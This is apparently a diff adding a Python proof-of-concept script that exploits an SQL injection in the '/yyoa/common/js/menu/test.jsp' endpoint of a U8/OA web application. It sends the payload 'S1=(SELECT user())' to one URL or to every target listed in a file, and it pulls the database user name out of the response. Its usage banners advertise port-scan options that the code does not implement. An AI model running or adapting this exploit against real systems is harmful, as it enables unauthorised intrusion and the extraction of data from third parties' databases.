@@ -1,0 +1,99 @@
+#!/usr/bin/env python3
+#-*-coding:utf-8-*-
+import sys
+import requests
+import time
+import re
+import argparse
+import socket
+import base64
+import queue
+import threading
+import urllib3
+import urllib
+def sign():
+    print("")
+    print("\033[1;31;40m ('-----------------------------------------------------------------------------------------------')\033[0m")
+    print("\033[1;34;40m _   _  ___      _      _            _   ____                ____        _                          \033[0m")
+    print("\033[1;34;40m| | | |( _ )  __| | ___| |_ ___  ___| |_|  _ \ ___   ___    / ___|  __ _| |                         \033[0m")
+    print("\033[1;34;40m| | | |/ _ \ / _` |/ _ \ __/ _ \/ __| __| |_) / _ \ / __|   \___ \ / _` | |                         \033[0m")
+    print("\033[1;34;40m| |_| | (_) | (_| |  __/ ||  __/ (__| |_|  __/ (_) | (__     ___) | (_| | |                         \033[0m")
+    print("\033[1;36;40m \___/ \___/ \__,_|\___|\__\___|\___|\__|_|   \___/ \___|___|____/ \__, |_|                         \033[0m")
+    print("\033[1;36;40m                                                       |_____|        |_|  v1.0    author:dddjx_Qian\033[0m")
+    print("\033[1;31;40m ('-----------------------------------------------------------------------------------------------')\033[0m")
+    print("\n\033[1;31;40m[+]\033[0m\033[1;33;40m[Example]\033[1;31;40m[+]\033[0m")
+    print("python U8detectPOC_Sql.py -f xxx.txt")
+    print("python3 U8detectPOC_Sql.py -i 127.0.0.1 -p 1000 -t 100")
+    print("python3 U8detectPOC_Sql.py -u https://www.baidu.com \n")
+    print("\033[1;31;40m[+]\033[0m\033[1;33;40m[Value]\033[1;31;40m[+]\033[0m")
+    print("-u/--url: Enter URL Detecting U8 SQL Vulnerabilities[输入URL检测U8 SQL漏洞]")
+    print("-f/file: Batch check the IP addresses in the text for U8sql vulnerability,Please Input a file![批量检查文本中的IP地址是否存在U8sql漏洞，请输入文件!]")
+
+
+
+parser = argparse.ArgumentParser(prog='\033[1;34;40m[+]\033[0m\033[1;31;40m U8detectPOC_Sql \033[0m\033[1;34;40m[+]\033[0m',description=
+'\033[1;34;40m[+]\033[0m\033[1;31;40mThis is the U8detectPOC_Sql instructions[以下是U8detectPOC_Sql使用说明!]\033[0m\033[1;34;40m[+]\033[0m',
+epilog=sign()) #提供命令行界面 argprse
+time.sleep(0.2)
+parser.add_argument('-u','--url', help='Check whether the U8sql vulnerability exists,Please Input a url[检查是否存在U8sql漏洞,请输入url]',default='')
+parser.add_argument('-f','--file', help='Batch check the IP addresses in the text for U8sql vulnerability,Please Input a file!'
+'[批量检查文本中的IP地址是否存在U8sql漏洞，请输入文件]',default='')
+args = parser.parse_args()
+
+urllib3.disable_warnings()
+name = f'''
+\033[1;31;40m ("-----------------------------------------------------------------------------------------------")\033[0m
+\033[1;34;40m _   _  ___      _      _            _   ____                ____        _                          \033[0m
+\033[1;34;40m| | | |( _ )  __| | ___| |_ ___  ___| |_|  _ \ ___   ___    / ___|  __ _| |                         \033[0m
+\033[1;34;40m| | | |/ _ \ / _` |/ _ \ __/ _ \/ __| __| |_) / _ \ / __|   \___ \ / _` | |                         \033[0m
+\033[1;34;40m| |_| | (_) | (_| |  __/ ||  __/ (__| |_|  __/ (_) | (__     ___) | (_| | |                         \033[0m
+\033[1;36;40m \___/ \___/ \__,_|\___|\__\___|\___|\__|_|   \___/ \___|___|____/ \__, |_|                         \033[0m
+\033[1;36;40m                                                       |_____|        |_|  v1.0    author:dddjx_Qian\033[0m    
+\033[1;31;40m ("-----------------------------------------------------------------------------------------------")\033[0m
+\033[1;31;40m[+]\033[0m\033[1;33;40m[Portscan]\033[1;31;40m[+]\033[0m
+    python U8detectPOC_Sql.py -i ip -p [port_scope|top_num] [-t thread_num]
+    python U8detectPOC_Sql.py -host url -p [port_scope|top_num] [-t thread_num]\n\n\033[1;31;40m[+]\033[0m\033[1;33;40m[Example]\033[1;31;40m[+]\033[0m
+    python3 U8detectPOC_Sql.py -i 127.0.0.1 -p 1000 -t 100
+    python3 U8detectPOC_Sql.py -host https://www.baidu.com -p 1-65535
+    
+
+\033[1;31;40m[+]\033[0m\033[1;33;40m[Value]\033[1;31;40m[+]\033[0m
+    -i: Enter the IP address of the port to be queried[输入待查询端口的IP地址]
+    -p: Enter how many ports to query [1-65565][要查询多少端口]
+    -u: Enter URL Detecting U8 SQL Vulnerabilities[输入URL检测U8 SQL漏洞]
+    -t: Set your thread count[设置线程数]
+'''
+time.sleep(0.6)
+
+def poc(url):
+    print('\033[1;31;40m''[+]','-'*63,'[+]''\033[0m')
+    try:
+        target = url +"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT user())"
+        r = requests.get(url=target,timeout=8,verify=False)
+        if r.status_code ==200 and '序号' in r.text:
+            print(url+"  漏洞存在！")
+            match = re.search(r'<td align=left>(.*?)</td>',r.text,re.I|re.M)
+            if match:
+                print("为您查询到user(): "+match[1])
+            else:
+                print("未匹配到！")
+        else:
+            print(url+"  漏洞不存在！")
+    except:
+        print("\t漏洞不存在,请确认该网站是否存在此路径,或者网站是否存活")
+    print('\033[1;31;40m''[+]','-'*63,'[+]''\033[0m')
+
+def more(file):
+    f = open(file,'r')
+    for i in f.readlines():
+        i = i.strip()
+        poc(i)
+
+if __name__ == '__main__':
+    if args.url !='' and args.file =='':
+        poc(args.url)
+    if args.url =='' and args.file !='':
+        more(args.file)
+
+
+
